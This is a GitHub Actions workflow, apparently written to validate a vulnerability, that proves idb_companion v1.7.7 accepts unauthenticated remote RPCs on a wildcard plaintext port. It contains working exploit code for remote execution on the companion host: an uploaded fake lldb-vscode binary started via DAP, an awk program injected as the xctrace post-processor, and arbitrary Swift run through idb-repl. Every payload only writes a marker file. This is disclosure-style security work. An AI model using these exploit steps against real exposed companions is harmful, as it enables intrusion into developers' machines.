name: Validate idb unauthenticated remote companion

on:
  workflow_dispatch:

permissions:
  contents: read

jobs:
  validate:
    runs-on: macos-26
    timeout-minutes: 30
    steps:
      - name: Download and verify official v1.7.7 artifacts
        shell: bash
        run: |
          set -euo pipefail
          base='https://github.com/facebook/idb/releases/download/v1.7.7'
          curl --fail --location --retry 3 --output "$RUNNER_TEMP/idb-companion.tar.gz" "$base/idb-companion.macos-arm64.tar.gz"
          curl --fail --location --retry 3 --output "$RUNNER_TEMP/idb-companion.tar.gz.sha256" "$base/idb-companion.macos-arm64.tar.gz.sha256"
          curl --fail --location --retry 3 --output "$RUNNER_TEMP/fb_idb-1.7.7-py3-none-any.whl" "$base/fb_idb-1.7.7-py3-none-any.whl"
          expected="$(awk '{print $1}' "$RUNNER_TEMP/idb-companion.tar.gz.sha256")"
          actual="$(shasum -a 256 "$RUNNER_TEMP/idb-companion.tar.gz" | awk '{print $1}')"
          test "$actual" = "$expected"
          mkdir "$RUNNER_TEMP/idb-companion"
          tar -C "$RUNNER_TEMP/idb-companion" -xzf "$RUNNER_TEMP/idb-companion.tar.gz"
          codesign --verify --deep --strict "$RUNNER_TEMP/idb-companion/idb_companion"
          "$RUNNER_TEMP/idb-companion/idb_companion" --version
          python3 -m venv "$RUNNER_TEMP/venv"
          "$RUNNER_TEMP/venv/bin/pip" install --disable-pip-version-check "$RUNNER_TEMP/fb_idb-1.7.7-py3-none-any.whl"

      - name: Prove wildcard listener and credential-free remote RPCs
        shell: bash
        run: |
          set -euo pipefail
          companion="$RUNNER_TEMP/idb-companion/idb_companion"
          stdout="$RUNNER_TEMP/companion.stdout"
          stderr="$RUNNER_TEMP/companion.stderr"

          target_udid="$(xcrun simctl list devices available -j | python3 -c '
          import json, sys
          devices = json.load(sys.stdin)["devices"]
          for runtime in sorted(devices, reverse=True):
              if "iOS" not in runtime:
                  continue
              for device in devices[runtime]:
                  if device.get("isAvailable") and device.get("name", "").startswith("iPhone"):
                      print(device["udid"])
                      raise SystemExit
          raise SystemExit("no available iPhone simulator")
          ')"
          printf 'simulator_udid=%s\n' "$target_udid"
          xcrun simctl boot "$target_udid" 2>/dev/null || true
          xcrun simctl bootstatus "$target_udid" -b

          "$companion" \
            --udid "$target_udid" \
            --grpc-port 0 \
            --idle-shutdown-time 300 \
            --log-level debug \
            >"$stdout" 2>"$stderr" &
          companion_pid=$!
          cleanup() {
            kill "$companion_pid" 2>/dev/null || true
            wait "$companion_pid" 2>/dev/null || true
            xcrun simctl shutdown "$target_udid" 2>/dev/null || true
          }
          trap cleanup EXIT

          for _ in $(seq 1 60); do
            if test -s "$stdout"; then
              break
            fi
            if ! kill -0 "$companion_pid" 2>/dev/null; then
              cat "$stderr"
              exit 1
            fi
            sleep 1
          done
          test -s "$stdout"
          first_line="$(head -n 1 "$stdout")"
          printf 'startup=%s\n' "$first_line"
          port="$(python3 -c 'import json,sys; print(json.loads(sys.argv[1])["grpc_port"])' "$first_line")"
          test "$port" -gt 0

          listener="$(lsof -nP -a -p "$companion_pid" -iTCP:"$port" -sTCP:LISTEN)"
          printf '%s\n' "$listener"
          printf '%s\n' "$listener" | grep -E '\*:'"$port"'|\[::\]:'"$port"

          interface="$(route -n get default | awk '/interface:/{print $2; exit}')"
          host_ip="$(ipconfig getifaddr "$interface")"
          test -n "$host_ip"
          test "$host_ip" != '127.0.0.1'
          target="$host_ip:$port"
          printf 'remote_target=%s\n' "$target"

          env -u IDB_COMPANION -u IDB_COMPANION_TLS \
            "$RUNNER_TEMP/venv/bin/idb" --companion "$target" describe --json \
            | tee "$RUNNER_TEMP/describe.json"
          python3 - "$RUNNER_TEMP/describe.json" "$host_ip" <<'PY'
          import json
          import pathlib
          import sys

          description = json.loads(pathlib.Path(sys.argv[1]).read_text())
          assert description.get("target_type") == "simulator", description
          address = description.get("companion_info", {}).get("address", {})
          assert address.get("host") == sys.argv[2], description
          print(f"unauthenticated_describe_target={description['udid']}")
          PY

          dap_marker="$RUNNER_TEMP/idb-unauthenticated-dap-host-rce"
          dap_package="$RUNNER_TEMP/attacker-dap"
          mkdir -p "$dap_package/usr/bin"
          cat > "$dap_package/usr/bin/lldb-vscode" <<EOF
          #!/bin/sh
          printf '%s\n' 'remote-host-code-executed-via-dap' > '$dap_marker'
          while IFS= read -r line; do :; done
          EOF
          chmod 755 "$dap_package/usr/bin/lldb-vscode"
          test ! -e "$dap_marker"
          "$RUNNER_TEMP/venv/bin/python" - "$host_ip" "$port" "$dap_package" <<'PY'
          import asyncio
          import logging
          import pathlib
          import sys

          from idb.common.types import FileContainerType, TCPAddress
          from idb.grpc.client import Client
          from idb.grpc.dap import RemoteDapServer

          async def main() -> None:
              host, port, package = sys.argv[1], int(sys.argv[2]), pathlib.Path(sys.argv[3])
              address = TCPAddress(host=host, port=port)
              logger = logging.getLogger("unauthenticated-dap-proof")
              async with Client.build(address=address, logger=logger, exchange_metadata=False) as client:
                  await client.mkdir(container=FileContainerType.ROOT, path="dap")
                  await client.push(
                      src_paths=[str(package)],
                      container=FileContainerType.ROOT,
                      dest_path="dap",
                      compression=None,
                  )
                  async with RemoteDapServer.start(client.stub, logger, package.stem):
                      await asyncio.sleep(1)
              print("unauthenticated_dap=uploaded executable launched as companion-host subprocess")

          asyncio.run(main())
          PY
          test "$(cat "$dap_marker")" = 'remote-host-code-executed-via-dap'

          host_marker="$RUNNER_TEMP/idb-unauthenticated-host-rce"
          test ! -e "$host_marker"
          "$RUNNER_TEMP/venv/bin/python" - "$host_ip" "$port" "$host_marker" "$RUNNER_TEMP/untrusted-trace" <<'PY'
          import asyncio
          import logging
          import pathlib
          import sys

          from idb.common.types import TCPAddress
          from idb.grpc.client import Client

          async def main() -> None:
              host, port, marker, output = sys.argv[1], int(sys.argv[2]), sys.argv[3], sys.argv[4]
              address = TCPAddress(host=host, port=port)
              logger = logging.getLogger("unauthenticated-xctrace-proof")
              async with Client.build(address=address, logger=logger, exchange_metadata=False) as client:
                  stop = asyncio.Event()

                  async def stop_later() -> None:
                      await asyncio.sleep(3)
                      stop.set()

                  stopper = asyncio.create_task(stop_later())
                  program = f'BEGIN {{ print "remote-host-code-executed" > "{marker}"; exit }}'
                  try:
                      await client.xctrace_record(
                          stop=stop,
                          output=output,
                          template_name="Time Profiler",
                          all_processes=True,
                          time_limit=10.0,
                          post_args=["/usr/bin/awk", program, "ignored.trace"],
                          stop_timeout=30.0,
                      )
                  except Exception as error:
                      # The attacker-selected processor intentionally does not produce the
                      # trace path the server later tries to archive. Its side effect is the proof.
                      print(f"postprocess_collection_error={error!r}")
                  finally:
                      stopper.cancel()

              observed = pathlib.Path(marker).read_text()
              assert observed == "remote-host-code-executed\n", observed
              print("unauthenticated_xctrace_postprocessor=companion-host code executed")

          asyncio.run(main())
          PY
          test "$(cat "$host_marker")" = 'remote-host-code-executed'

          repl_output="$(env -u IDB_COMPANION -u IDB_COMPANION_TLS \
            "$RUNNER_TEMP/idb-companion/idb-repl" \
            --reason 'Authorized security validation on a disposable runner' \
            app \
            --companion "$target" \
            'let path = NSTemporaryDirectory() + "idb-unauthenticated-proof"; try "remote-code-executed".write(toFile: path, atomically: true, encoding: .utf8); return "\(ProcessInfo.processInfo.processIdentifier):\(try String(contentsOfFile: path, encoding: .utf8))"')"
          printf '%s\n' "$repl_output"
          printf '%s\n' "$repl_output" | grep -q 'remote-code-executed'
          printf 'unauthenticated_repl=arbitrary Swift executed in target process\n'

          env -u IDB_COMPANION -u IDB_COMPANION_TLS \
            "$RUNNER_TEMP/venv/bin/idb" --companion "$target" list-apps --json \
            > "$RUNNER_TEMP/apps.json"
          python3 - "$RUNNER_TEMP/apps.json" <<'PY'
          import json
          import pathlib
          import sys

          lines = [line for line in pathlib.Path(sys.argv[1]).read_text().splitlines() if line]
          apps = [json.loads(line) for line in lines]
          assert all(isinstance(app, dict) for app in apps), apps
          print(f"unauthenticated_list_apps_count={len(apps)}")
          PY

          grep -q 'Starting swift server on tcp port' "$stderr"
          if grep -q 'Starting swift server with TLS path' "$stderr"; then
            echo 'unexpected TLS listener' >&2
            exit 1
          fi
          printf 'proof=PASS wildcard plaintext listener accepted remote-address RPCs, uploaded companion-host DAP code, companion-host postprocessor code and arbitrary REPL code without credentials\n'
